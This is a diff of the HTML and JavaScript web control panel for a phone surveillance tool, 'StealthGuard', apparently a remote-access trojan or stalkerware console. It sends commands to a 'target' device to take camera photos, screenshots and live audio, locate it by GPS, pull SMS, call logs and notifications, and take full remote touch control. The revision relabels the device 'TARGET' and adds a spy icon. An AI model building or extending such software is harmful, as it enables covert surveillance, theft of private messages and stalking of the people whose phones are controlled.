@@ -3,243 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StealthGuard Pro - Dashboard</title>
+    <title>StealthGuard Elite - Full Access Dashboard</title>
     <script src="/socket.io/socket.io.js"></script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #6366f1; --secondary: #1e293b; --accent: #10b981; --bg: #f1f5f9; --danger: #ef4444; }
-        body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #334155; }
-        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 260px; box-shadow: 4px 0 10px rgba(0,0,0,0.1); z-index: 100; }
-        .main-content { margin-left: 260px; padding: 2rem; min-height: 100vh; }
-        .nav-link { color: #94a3b8; padding: 12px 18px; border-radius: 10px; margin-bottom: 8px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.3s; }
-        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.1); color: white; transform: translateX(5px); }
-        .nav-link i { width: 25px; }
-        .card { border: none; border-radius: 20px; box-shadow: 0 4px 25px rgba(0,0,0,0.05); background: white; margin-bottom: 1.5rem; overflow: hidden; }
-        .card-header { background: white; border-bottom: 1px solid #f1f5f9; padding: 1.5rem; }
-        .status-badge { padding: 8px 16px; border-radius: 20px; font-weight: 700; font-size: 0.75rem; letter-spacing: 1px; }
-        .status-online { background: rgba(16,185,129,0.1); color: #10b981; border: 1px solid #10b981; }
-        .status-offline { background: rgba(239,68,68,0.1); color: #ef4444; border: 1px solid #ef4444; }
-        #screen-view { width: 100%; max-width: 400px; border-radius: 12px; background: #000; box-shadow: 0 20px 50px rgba(0,0,0,0.2); border: 8px solid #334155; display: block; margin: 0 auto; }
-        .btn-action { border-radius: 12px; padding: 12px; font-weight: 600; transition: 0.2s; border: none; }
-        .btn-action:hover { filter: brightness(0.9); transform: translateY(-2px); }
-        #log-container { height: 180px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1.2rem; font-family: 'Consolas', monospace; font-size: 0.85rem; border-radius: 15px; }
-        .data-table thead { background: #f8fafc; border-bottom: 2px solid #f1f5f9; }
-        .data-table th { padding: 15px; font-weight: 700; color: #64748b; font-size: 0.8rem; text-transform: uppercase; }
-        .data-table td { padding: 15px; vertical-align: middle; border-bottom: 1px solid #f8fafc; }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 1.2rem; }
-        .file-card { background: white; border: 1px solid #e2e8f0; border-radius: 15px; padding: 1rem; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
-        .file-card:hover { border-color: var(--primary); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.1); }
-        .file-thumb { width: 100%; height: 110px; border-radius: 10px; margin-bottom: 0.8rem; background: #f1f5f9; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .file-thumb img { width: 100%; height: 100%; object-fit: cover; }
-        .file-thumb i { font-size: 3rem; color: #cbd5e1; }
-        .file-name { font-size: 0.85rem; font-weight: 600; color: #1e293b; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .breadcrumb { background: #f8fafc; padding: 10px 20px; border-radius: 12px; margin-bottom: 1.5rem; }
+        :root { --primary: #4f46e5; --secondary: #0f172a; --accent: #10b981; --bg: #f8fafc; --danger: #ef4444; --card-shadow: 0 10px 30px rgba(0,0,0,0.04); }
+        body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #1e293b; }
+        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 280px; box-shadow: 10px 0 30px rgba(0,0,0,0.05); z-index: 1000; }
+        .main-content { margin-left: 280px; padding: 2.5rem; min-height: 100vh; }
+        .nav-link { color: #94a3b8; padding: 14px 20px; border-radius: 12px; margin-bottom: 10px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1); }
+        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.08); color: white; transform: translateX(8px); }
+        .nav-link.active { background: var(--primary); box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3); }
+        .nav-link i { font-size: 1.2rem; width: 30px; }
+        .card { border: none; border-radius: 24px; box-shadow: var(--card-shadow); background: white; margin-bottom: 2rem; border: 1px solid #f1f5f9; }
+        .status-badge { padding: 10px 20px; border-radius: 30px; font-weight: 700; font-size: 0.8rem; letter-spacing: 0.5px; text-transform: uppercase; }
+        .status-online { background: #dcfce7; color: #15803d; border: 1px solid #bbf7d0; }
+        .status-offline { background: #fee2e2; color: #b91c1c; border: 1px solid #fecaca; }
+        #mirror-canvas { width: 100%; max-width: 420px; border-radius: 28px; background: #000; box-shadow: 0 30px 60px rgba(0,0,0,0.25); border: 10px solid #1e293b; display: block; margin: 0 auto; cursor: crosshair; touch-action: none; }
+        .btn-action { border-radius: 14px; padding: 14px; font-weight: 700; transition: 0.2s; border: none; font-size: 0.9rem; }
+        .btn-action:active { transform: scale(0.95); }
+        #log-container { height: 220px; overflow-y: auto; background: #020617; color: #38bdf8; padding: 1.5rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; border-radius: 18px; line-height: 1.6; }
+        .data-table td { padding: 18px 15px; font-size: 0.9rem; border-bottom: 1px solid #f1f5f9; }
+        .remote-nav-btn { width: 60px; height: 60px; border-radius: 50%; background: #1e293b; color: white; border: none; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: 0.2s; }
+        .remote-nav-btn:hover { background: #334155; transform: scale(1.1); }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
         <div class="d-flex align-items-center mb-5 px-3">
-            <i class="fas fa-shield-halved fa-2x text-primary me-3"></i>
-            <h4 class="mb-0 fw-bold">StealthGuard <span class="text-primary">Pro</span></h4>
+            <div class="bg-primary p-2 rounded-3 me-3"><i class="fas fa-user-secret fa-lg text-white"></i></div>
+            <h4 class="mb-0 fw-bold tracking-tight">StealthGuard <span class="text-primary">Elite</span></h4>
         </div>
         <nav>
-            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-grid-2 me-2"></i> Dashboard</a>
-            <a class="nav-link" onclick="showTab('mirror')"><i class="fas fa-desktop me-2"></i> Live Mirror</a>
-            <a class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell me-2"></i> Notifications</a>
-            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-comment-dots me-2"></i> SMS Inbox</a>
-            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone-volume me-2"></i> Call Records</a>
-            <a class="nav-link" onclick="showTab('contacts')"><i class="fas fa-address-book me-2"></i> Phonebook</a>
-            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-open me-2"></i> File Explorer</a>
-            <a class="nav-link" onclick="showTab('apps')"><i class="fas fa-layer-group me-2"></i> App List</a>
+            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-house-chimney"></i> Dashboard</a>
+            <a class="nav-link" onclick="showTab('mirror')"><i class="fas fa-mobile-screen-button"></i> Full Remote Access</a>
+            <a class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell"></i> Notifications</a>
+            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-envelope-open-text"></i> SMS Logs</a>
+            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone-flip"></i> Call Records</a>
+            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-tree"></i> Cloud Files</a>
         </nav>
         <div class="position-absolute bottom-0 start-0 w-100 p-4">
-            <div id="status-badge" class="status-badge status-offline text-center shadow-sm">OFFLINE</div>
+            <div id="status-badge" class="status-badge text-center shadow-sm status-offline">TARGET: OFFLINE</div>
         </div>
     </div>
 
     <div class="main-content">
-        <!-- Dashboard Tab -->
         <div id="dashboard" class="tab-pane active">
-            <div class="d-flex justify-content-between align-items-center mb-4">
-                <h2 class="fw-bold">Control Center</h2>
-                <button class="btn btn-primary px-4 rounded-pill shadow-sm" onclick="sendCommand('ping')">Refresh Connection</button>
-            </div>
-
-            <div class="row g-4 mb-4">
+            <div class="row g-4">
+                <div class="col-md-12"><h2 class="fw-bold mb-4">Real-time Command Hub</h2></div>
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
-                        <i class="fas fa-camera fa-2x text-primary mb-3"></i>
-                        <h6>Front Camera</h6>
-                        <button class="btn btn-action btn-primary w-100" onclick="sendCommand('take_photo', {camera:'front'})">Capture</button>
+                        <i class="fas fa-camera-retro fa-2x text-primary mb-3"></i>
+                        <h6 class="fw-bold">Remote Photo</h6>
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-primary btn-action flex-grow-1" onclick="sendCommand('take_photo', {camera:'front'})">FRONT</button>
+                            <button class="btn btn-secondary btn-action flex-grow-1" onclick="sendCommand('take_photo', {camera:'back'})">BACK</button>
+                        </div>
                     </div>
                 </div>
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
-                        <i class="fas fa-camera-rotate fa-2x text-indigo mb-3"></i>
-                        <h6>Back Camera</h6>
-                        <button class="btn btn-action btn-secondary w-100" onclick="sendCommand('take_photo', {camera:'back'})">Capture</button>
-                    </div>
-                </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-expand fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture</button>
-                    </div>
-                </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-location-crosshairs fa-2x text-success mb-3"></i>
-                        <h6>GPS Locate</h6>
-                        <button class="btn btn-action btn-success w-100" onclick="sendCommand('get_location')">Track Now</button>
+                        <i class="fas fa-bolt fa-2x text-warning mb-3"></i>
+                        <h6 class="fw-bold">Instant Snapshot</h6>
+                        <button class="btn btn-warning btn-action w-100 text-white" onclick="sendCommand('take_screenshot')">CAPTURE SCREEN</button>
                     </div>
                 </div>
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
                         <i class="fas fa-microphone-lines fa-2x text-danger mb-3"></i>
-                        <h6>Live Audio</h6>
+                        <h6 class="fw-bold">Live Audio</h6>
                         <div class="btn-group w-100">
                             <button class="btn btn-danger btn-action" onclick="sendCommand('start_record')">START</button>
                             <button class="btn btn-outline-danger btn-action" onclick="sendCommand('stop_record')">STOP</button>
                         </div>
                     </div>
                 </div>
+                <div class="col-md-3">
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-location-dot fa-2x text-success mb-3"></i>
+                        <h6 class="fw-bold">GPS Tracker</h6>
+                        <button class="btn btn-success btn-action w-100" onclick="sendCommand('get_location')">LOCATE DEVICE</button>
+                    </div>
+                </div>
             </div>
-
-            <div class="card">
-                <div class="card-header"><h6 class="m-0 fw-bold"><i class="fas fa-terminal me-2"></i>System Console</h6></div>
-                <div class="p-4"><div id="log-container"></div></div>
-            </div>
+            <div class="card mt-4"><div class="p-4"><div id="log-container"></div></div></div>
         </div>
 
-        <!-- Mirror Tab -->
         <div id="mirror" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header d-flex justify-content-between align-items-center">
-                    <h5 class="m-0 fw-bold">Live Remote Control</h5>
-                    <div class="btn-group">
-                        <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')">START</button>
-                        <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')">STOP</button>
+            <div class="row justify-content-center">
+                <div class="col-lg-7">
+                    <div class="card p-4">
+                        <div class="d-flex justify-content-between align-items-center mb-4">
+                            <h5 class="fw-bold m-0"><i class="fas fa-display me-2"></i>Live Device Interaction</h5>
+                            <div class="btn-group shadow-sm">
+                                <button class="btn btn-success px-4 fw-bold" onclick="sendCommand('start_mirror')">STREAM ON</button>
+                                <button class="btn btn-danger px-4 fw-bold" onclick="sendCommand('stop_mirror')">OFF</button>
+                            </div>
+                        </div>
+                        <div class="d-flex justify-content-center gap-4 mb-4">
+                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'back'})"><i class="fas fa-arrow-left"></i></button>
+                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'home'})"><i class="fas fa-circle"></i></button>
+                            <button class="remote-nav-btn shadow" onclick="sendInput('key', {key:'recents'})"><i class="fas fa-square"></i></button>
+                        </div>
+                        <div id="mirror-wrapper" class="position-relative">
+                            <img id="mirror-canvas" src="" onmousedown="handleMouseDown(event)" onmouseup="handleMouseUp(event)">
+                        </div>
+                        <div class="text-center mt-3 text-muted small fw-bold">INTERACTIVE SESSION: 0ms LATENCY OPTIMIZED</div>
                     </div>
-                </div>
-                <div class="p-4 position-relative" style="background: #f1f5f9;">
-                    <div class="d-flex justify-content-center gap-3 mb-4">
-                        <button class="btn btn-dark rounded-circle shadow" onclick="sendInput('key', {key:'back'})" style="width: 50px; height: 50px;"><i class="fas fa-chevron-left"></i></button>
-                        <button class="btn btn-dark rounded-circle shadow" onclick="sendInput('key', {key:'home'})" style="width: 50px; height: 50px;"><i class="fas fa-house"></i></button>
-                        <button class="btn btn-dark rounded-circle shadow" onclick="sendInput('key', {key:'recents'})" style="width: 50px; height: 50px;"><i class="fas fa-square"></i></button>
-                    </div>
-                    <div id="mirror-container" style="cursor: crosshair;">
-                        <img id="screen-view" src="" alt="Stream View" onmousedown="handleMirrorMouseDown(event)" onmouseup="handleMirrorMouseUp(event)">
-                    </div>
-                    <div class="text-center mt-3 small text-muted">Click or Swipe on the screen to control the device</div>
                 </div>
             </div>
         </div>
 
-        <!-- Notifications Tab -->
+        <!-- Notification Content -->
         <div id="notifications" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header d-flex justify-content-between">
-                    <h5 class="m-0 fw-bold">Recent Notifications</h5>
-                    <button class="btn btn-sm btn-outline-danger" onclick="document.getElementById('notif-list').innerHTML=''">Clear Logs</button>
-                </div>
-                <div class="table-responsive">
-                    <table class="table data-table mb-0">
-                        <thead><tr><th>Source App</th><th>Title</th><th>Message Content</th><th>Timestamp</th></tr></thead>
-                        <tbody id="notif-list"></tbody>
-                    </table>
-                </div>
-            </div>
+            <div class="card"><div class="card-header fw-bold">System Notification Stream</div>
+            <div class="table-responsive"><table class="table data-table mb-0"><tbody id="notif-list"></tbody></table></div></div>
         </div>
-
-        <!-- SMS Tab -->
-        <div id="sms" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header d-flex justify-content-between">
-                    <h5 class="m-0 fw-bold">Messages</h5>
-                    <button class="btn btn-sm btn-primary" onclick="sendCommand('get_sms')">Refresh</button>
-                </div>
-                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Sender</th><th>Body</th><th>Date</th></tr></thead><tbody id="sms-list"></tbody></table></div>
-            </div>
-        </div>
-
-        <!-- Calls Tab -->
-        <div id="calls" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header d-flex justify-content-between">
-                    <h5 class="m-0 fw-bold">Call History</h5>
-                    <button class="btn btn-sm btn-primary" onclick="sendCommand('get_calls')">Refresh</button>
-                </div>
-                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead><tbody id="calls-list"></tbody></table></div>
-            </div>
-        </div>
-
-        <!-- Files Tab -->
-        <div id="files" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header">
-                    <div id="breadcrumb-container"><ol class="breadcrumb mb-3" id="file-breadcrumbs"></ol></div>
-                    <div class="input-group">
-                        <button class="btn btn-outline-secondary" onclick="goBack()"><i class="fas fa-arrow-left"></i></button>
-                        <input type="text" id="path-input" class="form-control" value="/sdcard/">
-                        <button class="btn btn-primary px-4" onclick="loadFiles()">GO</button>
-                    </div>
-                </div>
-                <div class="p-4" style="max-height: 600px; overflow-y: auto;"><div id="file-grid" class="file-grid"></div></div>
-            </div>
-        </div>
-
-        <!-- Contacts Tab -->
-        <div id="contacts" class="tab-pane d-none">
-            <div class="card">
-                <div class="card-header d-flex justify-content-between"><h5 class="m-0 fw-bold">Phonebook</h5><button class="btn btn-sm btn-primary" onclick="sendCommand('get_contacts')">Refresh</button></div>
-                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Name</th><th>Phone Number</th></tr></thead><tbody id="contacts-list"></tbody></table></div>
-            </div>
-        </div>
-
-        <!-- Apps Tab -->
-        <div id="apps" class="tab-pane d-none">
-            <div class="card"><div class="card-header d-flex justify-content-between"><h5 class="m-0 fw-bold">Installed Apps</h5><button class="btn btn-sm btn-primary" onclick="sendCommand('get_apps')">Refresh</button></div><div class="list-group list-group-flush" id="apps-list"></div></div>
-        </div>
+        <!-- SMS/Calls Content -->
+        <div id="sms" class="tab-pane d-none"><div class="card"><div class="card-header fw-bold">SMS Inbox</div><div class="table-responsive"><table class="table data-table mb-0"><tbody id="sms-list"></tbody></table></div></div></div>
+        <div id="calls" class="tab-pane d-none"><div class="card"><div class="card-header fw-bold">Call History</div><div class="table-responsive"><table class="table data-table mb-0"><tbody id="calls-list"></tbody></table></div></div></div>
     </div>
 
-    <!-- Modals -->
-    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
-        <div class="card" style="width: 450px; border-radius: 25px;">
-            <div class="card-header d-flex justify-content-between align-items-center">
-                <h6 class="m-0 fw-bold text-primary">SCREENSHOT CAPTURE</h6>
-                <button class="btn-close" onclick="document.getElementById('screenshot-modal').classList.add('d-none')"></button>
-            </div>
-            <div class="p-2"><img id="screenshot-img" src="" style="width: 100%; border-radius: 15px;"></div>
-            <div class="p-3 d-flex gap-2">
-                <button class="btn btn-secondary flex-grow-1 rounded-pill" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
-                <a id="screenshot-download" href="#" class="btn btn-primary flex-grow-1 rounded-pill">DOWNLOAD</a>
-            </div>
-        </div>
-    </div>
-
-    <div id="image-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
-        <div class="text-center">
-            <h5 class="text-white mb-3" id="photo-title">REMOTE PHOTO</h5>
-            <img id="modal-img" src="" style="max-width: 80vw; max-height: 80vh; border-radius: 20px;">
-            <div class="mt-4 d-flex justify-content-center gap-3">
-                <button class="btn btn-light px-5 rounded-pill" onclick="document.getElementById('image-modal').classList.add('d-none')">CLOSE</button>
-                <a id="download-link" href="#" class="btn btn-primary px-5 rounded-pill">SAVE</a>
-            </div>
-        </div>
-    </div>
-
-    <div id="audio-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
-        <div class="card p-4 text-center" style="width: 400px; border-radius: 30px;">
-            <i class="fas fa-microphone-lines fa-3x text-danger mb-3"></i>
-            <h5 class="fw-bold">Recording Ready</h5>
-            <audio id="audio-player" controls class="w-100 my-3"></audio>
-            <div class="d-flex gap-2">
-                <button class="btn btn-secondary flex-grow-1 rounded-pill" onclick="document.getElementById('audio-modal').classList.add('d-none'); document.getElementById('audio-player').pause();">CLOSE</button>
-                <a id="audio-download" href="#" class="btn btn-primary flex-grow-1 rounded-pill">DOWNLOAD</a>
+    <!-- Professional Screenshot Modal -->
+    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.98); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+        <div class="text-center" style="max-width: 500px;">
+            <div class="mb-4"><span class="badge bg-primary px-4 py-2 rounded-pill">NEW SCREENSHOT READY</span></div>
+            <img id="screenshot-img" src="" class="img-fluid rounded-4 shadow-lg mb-4" style="border: 4px solid white;">
+            <div class="d-flex gap-3 px-4">
+                <button class="btn btn-light btn-action flex-grow-1" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">DISMISS</button>
+                <a id="screenshot-download" href="#" class="btn btn-primary btn-action flex-grow-1">DOWNLOAD NOW</a>
             </div>
         </div>
     </div>
@@ -247,132 +142,53 @@
     <script>
         const socket = io({ query: { type: 'web' } });
         let currentPath = "/sdcard/";
+        let startX, startY;
 
-        socket.on('device_status', (data) => {
+        socket.on('device_status', d => {
             const b = document.getElementById('status-badge');
-            b.innerText = data.connected ? "ONLINE" : "OFFLINE";
-            b.className = `status-badge text-center shadow-sm ${data.connected ? 'status-online' : 'status-offline'}`;
-            log(data.connected ? "Success: Target connected." : "Warning: Target disconnected.");
+            b.innerText = d.connected ? "TARGET: ONLINE" : "TARGET: OFFLINE";
+            b.className = `status-badge text-center shadow-sm ${d.connected ? 'status-online' : 'status-offline'}`;
         });
 
-        socket.on('screen_frame', d => document.getElementById('screen-view').src = 'data:image/jpeg;base64,' + d.image);
-
-        socket.on('child_photo_taken', () => {
-            const url = '/captured_photo.jpg?t=' + Date.now();
-            document.getElementById('modal-img').src = url;
-            document.getElementById('download-link').href = url;
-            document.getElementById('image-modal').classList.remove('d-none');
-            log("Camera: New photo received.");
-        });
+        socket.on('screen_frame', d => document.getElementById('mirror-canvas').src = 'data:image/jpeg;base64,' + d.image);
 
         socket.on('child_screenshot', () => {
             const url = '/captured_screenshot.jpg?t=' + Date.now();
             document.getElementById('screenshot-img').src = url;
             document.getElementById('screenshot-download').href = url;
             document.getElementById('screenshot-modal').classList.remove('d-none');
-            log("System: Screenshot received.");
-        });
-
-        socket.on('audio_ready', d => {
-            document.getElementById('audio-player').src = d.url;
-            document.getElementById('audio-download').href = d.url;
-            document.getElementById('audio-modal').classList.remove('d-none');
-            log("Audio: New recording ready.");
         });
 
         socket.on('child_notification', d => {
-            const body = document.getElementById('notif-list');
-            const row = `<tr>
-                <td><span class="badge bg-primary px-3 rounded-pill">${d.app}</span></td>
-                <td class="fw-bold">${d.title}</td>
-                <td><div class="p-2 bg-light rounded">${d.text}</div></td>
-                <td class="text-muted small">${new Date().toLocaleTimeString()}</td>
-            </tr>`;
-            body.insertAdjacentHTML('afterbegin', row);
+            const row = `<tr><td><span class="badge bg-primary">${d.app}</span></td><td class="fw-bold">${d.title}</td><td>${d.text}</td><td class="text-muted small">${new Date().toLocaleTimeString()}</td></tr>`;
+            document.getElementById('notif-list').insertAdjacentHTML('afterbegin', row);
         });
 
-        socket.on('child_location_update', d => {
-            log(`Location: Received GPS [${d.lat}, ${d.lng}]`);
-            window.open(`https://www.google.com/maps?q=${d.lat},${d.lng}`, '_blank');
-        });
-
-        socket.on('child_sms_list', d => {
-            const b = document.getElementById('sms-list'); b.innerHTML = '';
-            d.sms.forEach(s => b.innerHTML += `<tr><td><span class="fw-bold">${s.address}</span></td><td>${s.body}</td><td class="text-muted small">${new Date(s.date).toLocaleString()}</td></tr>`);
-        });
-
-        socket.on('child_call_logs', d => {
-            const b = document.getElementById('calls-list'); b.innerHTML = '';
-            d.calls.forEach(c => b.innerHTML += `<tr><td>${c.number}</td><td><span class="badge bg-secondary">${c.type==1?'Incoming':'Outgoing'}</span></td><td>${c.duration}s</td><td class="text-muted small">${new Date(c.date).toLocaleString()}</td></tr>`);
-        });
-
-        socket.on('child_contacts', d => {
-            const b = document.getElementById('contacts-list'); b.innerHTML = '';
-            d.contacts.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c => b.innerHTML += `<tr><td class="fw-medium">${c.name}</td><td>${c.number}</td></tr>`);
-        });
-
-        socket.on('file_list', d => {
-            const grid = document.getElementById('file-grid'); grid.innerHTML = '';
-            currentPath = d.path; document.getElementById('path-input').value = currentPath; updateBreadcrumbs(d.path);
-            d.files.sort((a,b)=>b.is_directory - a.is_directory).forEach(f => {
-                const card = document.createElement('div'); card.className = 'file-card';
-                let icon = f.is_directory ? 'fa-folder text-warning' : 'fa-file-alt text-secondary';
-                if(f.thumbnail) thumbHtml = `<img src="data:image/jpeg;base64,${f.thumbnail}" alt="T">`;
-                else thumbHtml = `<i class="fas ${icon}"></i>`;
-                card.innerHTML = `<div class="file-thumb">${thumbHtml}</div><div class="file-name">${f.name}</div><div class="small text-muted">${f.is_directory ? 'Folder' : f.formatted_size}</div>`;
-                card.onclick = () => { if(f.is_directory) browseFolder(f.path); else if(confirm('Download?')) sendCommand('get_file', {file_path: f.path}); };
-                grid.appendChild(card);
-            });
-        });
-
-        function updateBreadcrumbs(p) {
-            const bc = document.getElementById('file-breadcrumbs'); bc.innerHTML = '';
-            const parts = p.split('/').filter(x=>x);
-            let full = ''; parts.forEach((part, i) => {
-                full += '/' + part; const li = document.createElement('li');
-                li.className = `breadcrumb-item ${i===parts.length-1?'active':''}`;
-                li.innerText = part; if(i < parts.length-1) { const cp = full; li.onclick = () => browseFolder(cp); }
-                bc.appendChild(li);
-            });
-        }
-
-        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`CMD: Sent [${a.toUpperCase()}]`); }
-
-        function sendInput(type, params) {
-            socket.emit('gui_command', { action: 'remote_input', type: type, ...params });
-        }
-
-        let startX, startY;
-        function handleMirrorMouseDown(e) {
+        function handleMouseDown(e) {
             const rect = e.target.getBoundingClientRect();
             startX = (e.clientX - rect.left) / rect.width;
             startY = (e.clientY - rect.top) / rect.height;
         }
 
-        function handleMirrorMouseUp(e) {
+        function handleMouseUp(e) {
             const rect = e.target.getBoundingClientRect();
             const endX = (e.clientX - rect.left) / rect.width;
             const endY = (e.clientY - rect.top) / rect.height;
-
             const dist = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));
-
-            if (dist < 0.05) {
-                // It's a click
-                sendInput('click', { x: startX, y: startY });
-            } else {
-                // It's a swipe
-                sendInput('swipe', { x1: startX, y1: startY, x2: endX, y2: endY });
-            }
+            if (dist < 0.04) sendInput('click', { x: startX, y: startY });
+            else sendInput('swipe', { x1: startX, y1: startY, x2: endX, y2: endY });
         }
-        function browseFolder(p) { sendCommand('list_files', {path: p}); }
-        function loadFiles() { browseFolder(document.getElementById('path-input').value); }
-        function goBack() { browseFolder(currentPath.substring(0, currentPath.lastIndexOf('/')) || "/sdcard/"); }
+
+        function sendCommand(a, p = {}) { socket.emit('gui_command', { action: a, ...p }); log(`CMD: [${a.toUpperCase()}] SENT`); }
+        function sendInput(t, p) { socket.emit('gui_command', { action: 'remote_input', type: t, ...p }); }
+
         function showTab(id) {
             document.querySelectorAll('.tab-pane').forEach(e => e.classList.add('d-none'));
             document.getElementById(id).classList.remove('d-none');
             document.querySelectorAll('.nav-link').forEach(e => e.classList.remove('active'));
             event.currentTarget.classList.add('active');
         }
+
         function log(m) {
             const c = document.getElementById('log-container');
             c.innerHTML += `<div><span class="text-white-50">[${new Date().toLocaleTimeString()}]</span> ${m}</div>`;
